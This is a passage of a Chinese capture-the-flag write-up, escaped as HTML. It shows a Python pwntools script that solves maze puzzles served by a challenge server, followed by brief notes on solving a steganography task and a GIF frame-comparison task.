*&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirs=[(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)] &lt;span class=&#34;comment&#34;&gt;#当前位置四个方向的偏移量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path=[]              &lt;span class=&#34;comment&#34;&gt;#存找到的路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;mark&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;maze,pos&lt;/span&gt;):  &lt;span class=&#34;comment&#34;&gt;#给迷宫maze的位置pos标&amp;quot;2&amp;quot;表示“到过了”&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    maze[pos[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]][pos[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]=&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;passable&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;maze,pos&lt;/span&gt;): &lt;span class=&#34;comment&#34;&gt;#检查迷宫maze的位置pos是否可通行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; maze[pos[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]][pos[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;find_path&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;maze,pos,end&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mark(maze,pos)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; pos==end:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pos,end=&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;#已到达出口，输出这个位置。成功结束&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        path.append(pos)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;):      &lt;span class=&#34;comment&#34;&gt;#否则按四个方向顺序检查&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        nextp=pos[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]+dirs[i][&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;],pos[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+dirs[i][&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;#考虑下一个可能方向&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; passable(maze,nextp):        &lt;span class=&#34;comment&#34;&gt;#不可行的相邻位置不管&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; find_path(maze,nextp,end):&lt;span class=&#34;comment&#34;&gt;#如果从nextp可达出口，输出这个位置，成功结束&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(pos,end=&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                path.append(pos)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;False&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;see_path&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;maze,path,leng&lt;/span&gt;):     &lt;span class=&#34;comment&#34;&gt;#使寻找到的路径可视化&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    length = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i,p &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;enumerate&lt;/span&gt;(path):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; i==&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            maze[p[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]][p[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]] =&lt;span class=&#34;string&#34;&gt;&amp;quot;E&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; i==&lt;span class=&#34;built_in&#34;&gt;len&lt;/span&gt;(path)-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            maze[p[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]][p[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]]=&lt;span class=&#34;string&#34;&gt;&amp;quot;S&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            maze[p[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]][p[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]] =&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;\n&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; r &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; maze:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; c &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; c==&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0;31m&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;*&amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0m&amp;#x27;&lt;/span&gt;,end=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                length+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; c==&lt;span class=&#34;string&#34;&gt;&amp;quot;S&amp;quot;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;or&lt;/span&gt; c==&lt;span class=&#34;string&#34;&gt;&amp;quot;E&amp;quot;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0;34m&amp;#x27;&lt;/span&gt;+c+&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0m&amp;#x27;&lt;/span&gt;, end=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; c==&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0;32m&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot;#&amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0m&amp;#x27;&lt;/span&gt;,end=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; c==&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0;;40m&amp;#x27;&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+&lt;span class=&#34;string&#34;&gt;&amp;#x27;\033[0m&amp;#x27;&lt;/span&gt;,end=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot; &amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,end=&lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(length+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leng=length+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; leng&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;maze_change&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MAZE=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    row=col=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    M=&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(sh.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;P&amp;quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(M)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    MAZE.append([])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; m &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; M:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; col == num:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            MAZE.append([])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            row+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            col=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; m == &lt;span class=&#34;string&#34;&gt;&amp;#x27;\n&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; m == &lt;span class=&#34;string&#34;&gt;&amp;#x27;#&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            MAZE[row].append(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            col+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; m == &lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            MAZE[row].append(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            col+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; m == &lt;span class=&#34;string&#34;&gt;&amp;#x27;S&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            MAZE[row].append(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            start=(row,col)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            col+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; m ==&lt;span class=&#34;string&#34;&gt;&amp;#x27;E&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            MAZE[row].append(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            end=(row,col)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            col+=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;elif&lt;/span&gt; m ==&lt;span class=&#34;string&#34;&gt;&amp;#x27;P&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(MAZE)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; MAZE, start, end&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;gets&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;num&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    maze=[]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    start=(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    end=(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    maze,start,end=maze_change(num)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    find_path(maze,start,end)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leng=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    leng=see_path(maze,path,leng)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    sh.sendline(&lt;span class=&#34;built_in&#34;&gt;str&lt;/span&gt;(leng+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh=remote(&lt;span class=&#34;string&#34;&gt;&amp;quot;node4.buuoj.cn&amp;quot;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;27512&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;game&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendline(&lt;span class=&#34;string&#34;&gt;&amp;quot;1&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets(&lt;span class=&#34;number&#34;&gt;11&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;level!&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirs=[(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)] &lt;span class=&#34;comment&#34;&gt;#当前位置四个方向的偏移量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path=[]              &lt;span class=&#34;comment&#34;&gt;#存找到的路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets(&lt;span class=&#34;number&#34;&gt;21&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;level!&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirs=[(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)] &lt;span class=&#34;comment&#34;&gt;#当前位置四个方向的偏移量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path=[]              &lt;span class=&#34;comment&#34;&gt;#存找到的路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets(&lt;span class=&#34;number&#34;&gt;31&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;level!&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dirs=[(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;),(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;),(-&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)] &lt;span class=&#34;comment&#34;&gt;#当前位置四个方向的偏移量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;path=[]              &lt;span class=&#34;comment&#34;&gt;#存找到的路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gets(&lt;span class=&#34;number&#34;&gt;101&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 其中迷宫问题的部分代码是从&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzI5NjgxNzc3L2FydGljbGUvZGV0YWlscy84MzcxOTY4MA==&#34;&gt;这里&lt;/span&gt;复制来的&lt;br /&gt;
值得注意的是多次循环，变量初始化的问题，我排查了好久 (￣_￣|||)&lt;br /&gt;
 一开始没有注意到这个问题，还以为是我哪个顺序出错了，后来才发现。&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;misc-ezsteganography&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-ezsteganography&#34;&gt;#&lt;/a&gt; Misc-ezSteganography&lt;/h2&gt;
&lt;p&gt;比赛时只解出前半个，记录一下比赛时的错误思路	(。﹏。)：&lt;br /&gt;
（&lt;s&gt;根据第二个提示，后半大概率是 Green 通道里的图片藏了啥信息，然而第一个提示里的 QIM quantization 估计是加密方法，然后，我们就纠在 QIM 是啥的问题上了。。。&lt;/s&gt; ）&lt;/p&gt;
&lt;p&gt;然而实际上只要把 g0 和 g1 通道的两张图异或一下就可以了，就用 stegsolve 里的 Image Combiner 的功能&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/sycamore_cdn/wp-content/uploads/2021/09/post-187-613781a296735.png&#34; alt=&#34;前半flag加第一条提示&#34; /&gt;&lt;/p&gt;
&lt;p&gt;前半 flag 加第一条提示 ↑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a30a77f.png&#34; alt=&#34;第二条提示&#34; /&gt;&lt;/p&gt;
&lt;p&gt;第二条提示 ↑&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://cdn.jsdelivr.net/gh/nonesycamore/whitzard_cdn/wp-content/uploads/2021/09/post-187-613781a410b63.png&#34; alt=&#34;后半个flag&#34; /&gt;&lt;/p&gt;
&lt;p&gt;后半个 flag ↑&lt;/p&gt;
&lt;hr /&gt;
&lt;h2 id=&#34;misc-just-a-gif&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#misc-just-a-gif&#34;&gt;#&lt;/a&gt; Misc-Just a GIF&lt;/h2&gt;
&lt;p&gt;『赛后复现』和国赛&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tb2NodS5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMTY4NTUyNDI=&#34;&gt; running_pixel&lt;/span&gt; 的题基本是一个思路，gif 分离出 451 张图，分为 41 组，每组 11 张图。&lt;br /&gt;
然后每组的第 i 张和第一组的第 i 张作比较，不一样的画黑，就可以了。&lt;br /&gt;
